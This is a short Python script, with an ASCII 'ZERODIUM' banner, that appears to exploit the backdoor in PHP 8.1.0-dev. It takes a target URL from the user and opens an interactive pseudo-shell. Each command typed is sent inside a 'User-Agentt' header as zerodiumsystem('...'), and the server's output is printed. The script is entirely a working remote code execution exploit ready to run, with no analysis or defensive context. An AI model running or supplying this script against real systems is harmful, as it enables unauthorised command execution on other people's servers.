import os
import re
import requests

print("███████╗███████╗██████╗░░█████╗░░██████╗  ░█████╗░░█████╗░░█████╗░")
print("╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝  ██╔═══╝░██╔═══╝░██╔═══╝░")
print("░░███╔═╝█████╗░░██████╔╝██║░░██║╚█████╗░  ██████╗░██████╗░██████╗░")
print("██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗  ██╔══██╗██╔══██╗██╔══██╗")
print("███████╗███████╗██║░░██║╚█████╔╝██████╔╝  ╚█████╔╝╚█████╔╝╚█████╔╝")
print("╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░  ░╚════╝░░╚════╝░░╚════╝░")


host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
